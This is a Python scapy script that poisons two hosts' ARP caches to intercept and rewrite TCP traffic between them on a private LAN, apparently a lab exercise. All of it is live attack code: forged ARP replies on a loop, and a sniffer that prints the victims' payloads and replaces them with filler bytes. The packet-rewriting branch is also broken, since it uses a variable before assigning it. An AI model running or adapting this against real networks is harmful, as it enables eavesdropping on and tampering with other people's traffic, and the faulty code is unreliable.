#!/usr/bin/env python3

from scapy.all import ( 
	ARP, IP, TCP, Ether, sendp, sniff
)
from threading import Thread
from time import sleep

VICTIM_A_IP  = "192.168.33.138"
VICTIM_A_MAC = "00:0c:29:b2:98:75"
VICTIM_B_IP  = "192.168.33.143"
VICTIM_B_MAC = "00:0c:29:8a:fd:22"
ATTACKER_MAC = "00:0c:29:74:09:54"

THREADS = []

def PoisonARPCache():
	# Constructing packet for Victim A
	frameA = Ether()
	frameA.src = ATTACKER_MAC
	frameA.dst = VICTIM_A_MAC

	arpA = ARP()
	arpA.hwsrc = ATTACKER_MAC
	arpA.psrc = VICTIM_B_IP
	arpA.pdst = VICTIM_A_IP
	arpA.op = 1

	# Constructing packet for Victim B
	frameB = Ether()
	frameB.src = ATTACKER_MAC
	frameB.dst = VICTIM_B_MAC

	arpB = ARP()
	arpB.hwsrc = ATTACKER_MAC
	arpB.psrc = VICTIM_A_IP
	arpB.pdst = VICTIM_B_IP	
	arpB.op = 1

	packetA = frameA/arpA
	packetB = frameB/arpB

	while True:
		sendp(packetA)
		sendp(packetB)
		sleep(5)

def alterPacket(pkt):
	if (
		pkt.haslayer(IP) and pkt.haslayer(TCP)
		and pkt[IP].src == VICTIM_A_IP
		and pkt[IP].dst == VICTIM_B_IP
		and pkt[TCP].payload
	):
		print("Packet received!!")

		data = pkt[TCP].payload
		print("Packet length:", len(data))
		print("Original data:", data)

		del(newPacket.chksum)
		del(newPacket[TCP].payload)
		del(newPacket[TCP].chksum)

		newPayload = bytes("".join(["A" for _ in range(len(data))]), "utf-8")
		newPacket = newPacket/newPayload
		sendp(newPacket)
	elif (
		pkt.haslayer(IP)
		and pkt[IP].src == VICTIM_B_IP
		and pkt[IP].dst == VICTIM_A_IP
	):
		newPacket = pkt[IP]
		sendp(newPacket)
	return None

def startSniffing():
	sniff(iface="eth0", prn=alterPacket)

def createThread(func):
	newThread = Thread(target=func)
	newThread.start()
	THREADS.append(newThread)

def joinThreads():
	for thread in THREADS:
		thread.join()

if __name__ == "__main__":
	createThread(PoisonARPCache)
	createThread(startSniffing)
	joinThreads()
